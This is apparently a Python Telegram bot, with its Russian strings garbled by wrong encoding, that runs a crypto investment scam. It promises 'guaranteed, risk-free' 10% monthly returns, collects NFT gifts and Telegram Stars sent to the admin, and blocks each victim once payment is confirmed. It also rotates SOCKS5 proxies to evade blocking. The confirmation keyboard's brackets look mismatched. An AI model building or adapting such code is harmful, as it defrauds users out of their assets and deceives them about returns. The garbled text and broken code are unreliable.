import os
import logging
import threading
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Updater, CommandHandler, CallbackContext, 
    CallbackQueryHandler, MessageHandler, Filters
)
from telegram.utils.request import Request
from telegram.error import TimedOut, NetworkError

# ===== –ù–ê–°–¢–†–û–ô–ö–ò =====
TOKEN = os.environ["TOKEN"]
ADMIN_ID = int(os.environ["ADMIN_ID"])
ADMIN_USERNAME = os.environ["ADMIN_USERNAME"]
# =====================

# –ü—Ä–æ–∫—Å–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ –±–ª–æ–∫–∏—Ä–æ–≤–æ–∫
PROXY_LIST = [
    'socks5://138.197.222.35:1080',  # –°–®–ê
    'socks5://45.77.222.251:1080',   # –°–∏–Ω–≥–∞–ø—É—Ä
    'socks5://167.99.123.158:1080',  # –ì–µ—Ä–º–∞–Ω–∏—è
]

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è
BLOCKED_USERS = set()
STAR_CONFIRMATIONS = {}
current_proxy = 0

def get_proxy():
    global current_proxy
    proxy = PROXY_LIST[current_proxy]
    current_proxy = (current_proxy + 1) % len(PROXY_LIST)
    return proxy

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("üí∞ –ò–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å NFT (10% –≥–æ–¥–æ–≤—ã—Ö)", callback_data="invest_nft")],
        [InlineKeyboardButton("üí´ –û–ø–ª–∞—Ç–∏—Ç—å –∑–≤—ë–∑–¥–∞–º–∏", callback_data="pay_stars")],
        [InlineKeyboardButton("üåê –°–º–µ–Ω–∏—Ç—å —è–∑—ã–∫", callback_data="change_lang")],
        [InlineKeyboardButton("üÜò –ü–æ–¥–¥–µ—Ä–∂–∫–∞", callback_data="support")]
    ])

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in BLOCKED_USERS: return
    
    update.message.reply_text(
        "üî• **Crypto Wealth Bot Premium**\n"
        "‚Ä¢ –ì–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –¥–æ—Ö–æ–¥–Ω–æ—Å—Ç—å: 10% –≤ –º–µ—Å—è—Ü\n"
        "‚Ä¢ –ë–µ–∑ —Ä–∏—Å–∫–æ–≤ ‚Ä¢ –ú–≥–Ω–æ–≤–µ–Ω–Ω—ã–µ –≤—ã–ø–ª–∞—Ç—ã\n"
        "–í—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é:",
        reply_markup=main_menu_keyboard()
    )

def handle_invest_nft(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.edit_message_text(
        "üì§ –û—Ç–ø—Ä–∞–≤—å—Ç–µ NFT-–ø–æ–¥–∞—Ä–æ–∫ –¥–ª—è –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è. –ì–∞—Ä–∞–Ω—Ç–∏—è 10% –º–µ—Å—è—á–Ω—ã—Ö!\n\n"
        "‚ö†Ô∏è –ü—Ä–∏–Ω–∏–º–∞–µ–º —Ç–æ–ª—å–∫–æ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ NFT"
    )
    context.user_data['awaiting_nft'] = True

def handle_pay_stars(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    query.edit_message_text(
        f"üíé **–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –∑–≤—ë–∑–¥–∞–º–∏**\n\n"
        f"1. –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ –∫–æ—à–µ–ª–µ–∫ Telegram\n"
        f"2. –í—ã–±–µ—Ä–∏—Ç–µ '–ü–æ–ø–æ–ª–Ω–∏—Ç—å –∑–≤—ë–∑–¥–∞–º–∏'\n"
        f"3. –£–∫–∞–∂–∏—Ç–µ –ø–æ–ª—É—á–∞—Ç–µ–ª—è: {ADMIN_USERNAME}\n"
        f"4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –ª—é–±—É—é —Å—É–º–º—É\n\n"
        "–ü–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("‚úÖ –Ø –ø–æ–ø–æ–ª–Ω–∏–ª", callback_data="confirm_stars")]
        ])
    )

def handle_confirm_stars(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    username = f"@{query.from_user.username}" if query.from_user.username else f"ID:{user_id}"
    
    admin_msg = context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"‚ö†Ô∏è –ó–∞–ø—Ä–æ—Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è!\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {username} –æ—Ç–ø—Ä–∞–≤–∏–ª –∑–≤—ë–∑–¥—ã?",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("‚úÖ –î–∞", callback_data=f"stars_yes:{user_id}"),
            [InlineKeyboardButton("‚ùå –ù–µ—Ç", callback_data=f"stars_no:{user_id}")]
        ])
    )
    
    STAR_CONFIRMATIONS[user_id] = admin_msg.message_id
    query.edit_message_text("üïí –û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞...")

def handle_admin_response(update: Update, context: CallbackContext):
    query = update.callback_query
    admin_id = query.from_user.id
    action, user_id = query.data.split(":")
    user_id = int(user_id)
    
    if admin_id != ADMIN_ID:
        query.answer("‚ùå –¢—ã –Ω–µ –∞–¥–º–∏–Ω!")
        return
    
    if action == "stars_yes":
        BLOCKED_USERS.add(user_id)
        context.bot.send_message(
            chat_id=user_id,
            text="‚úÖ –ü–ª–∞—Ç–µ–∂ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –í–∞—à–∏ 10% –±—É–¥—É—Ç –Ω–∞—á–∏—Å–ª–µ–Ω—ã —á–µ—Ä–µ–∑ 30 –¥–Ω–µ–π."
        )
        response_text = "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–æ: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω"
    else:
        context.bot.send_message(
            chat_id=user_id,
            text="‚ùå –ü–ª–∞—Ç–µ–∂ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω! –ü—Ä–æ–≤–µ—Ä—å—Ç–µ:\n1. –ü—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å —é–∑–µ—Ä–Ω–µ–π–º–∞\n2. –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–µ—Ç–∏"
        )
        response_text = "‚ùå –û—Ç–∫–ª–æ–Ω–µ–Ω–æ: –ø–ª–∞—Ç–µ–∂ –Ω–µ –Ω–∞–π–¥–µ–Ω"
    
    try:
        context.bot.edit_message_text(
            chat_id=ADMIN_ID,
            message_id=STAR_CONFIRMATIONS[user_id],
            text=response_text
        )
        del STAR_CONFIRMATIONS[user_id]
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è: {e}")
    
    query.answer()

def handle_nft_gift(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in BLOCKED_USERS: return
    
    if context.user_data.get('awaiting_nft'):
        context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.message.chat_id,
            message_id=update.message.message_id
        )
        BLOCKED_USERS.add(user_id)
        update.message.reply_text("‚úÖ NFT –ø—Ä–∏–Ω—è—Ç! –î–æ—Ö–æ–¥–Ω–æ—Å—Ç—å 10% –Ω–∞—á–Ω–µ—Ç –Ω–∞—á–∏—Å–ª—è—Ç—å—Å—è –∑–∞–≤—Ç—Ä–∞.")
        context.user_data['awaiting_nft'] = False

def handle_support(update: Update, context: CallbackContext):
    query = update.callback_query
    query.edit_message_text("üìû –¢–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∞: @crypto_support_bot (–æ—Ç–≤–µ—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤)")

def change_lang(update: Update, context: CallbackContext):
    query = update.callback_query
    query.edit_message_text("‚úÖ –Ø–∑—ã–∫ –∏–∑–º–µ–Ω—ë–Ω!", reply_markup=main_menu_keyboard())

def keep_alive():
    while True:
        time.sleep(300)
        logging.info("üü¢ GitHub Actions Keep-Alive")

def start_bot_with_proxy(proxy):
    try:
        logging.info(f"üîÑ –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏: {proxy}")
        request = Request(
            proxy_url=proxy,
            connect_timeout=30,
            read_timeout=30
        )
        updater = Updater(TOKEN, request=request)
        
        dp = updater.dispatcher
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CallbackQueryHandler(handle_invest_nft, pattern="invest_nft"))
        dp.add_handler(CallbackQueryHandler(handle_pay_stars, pattern="pay_stars"))
        dp.add_handler(CallbackQueryHandler(handle_confirm_stars, pattern="confirm_stars"))
        dp.add_handler(CallbackQueryHandler(handle_admin_response, pattern=r"stars_(yes|no):"))
        dp.add_handler(CallbackQueryHandler(handle_support, pattern="support"))
        dp.add_handler(CallbackQueryHandler(change_lang, pattern="change_lang"))
        dp.add_handler(MessageHandler(Filters.all & ~Filters.command, handle_nft_gift))
        
        updater.start_polling(timeout=30, read_latency=5.0)
        logging.info("üü¢ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!")
        return updater
    except (TimedOut, NetworkError) as e:
        logging.error(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å–∏ {proxy}: {e}")
        return None

def main():
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ –ø—Ä–æ–∫—Å–∏
    for attempt in range(5):
        proxy = get_proxy()
        updater = start_bot_with_proxy(proxy)
        if updater:
            updater.idle()
            return
        time.sleep(10)
    
    logging.error("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –ø–æ—Å–ª–µ 5 –ø–æ–ø—ã—Ç–æ–∫")

if __name__ == "__main__":
    logging.basicConfig(
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        level=logging.INFO
    )
    main()
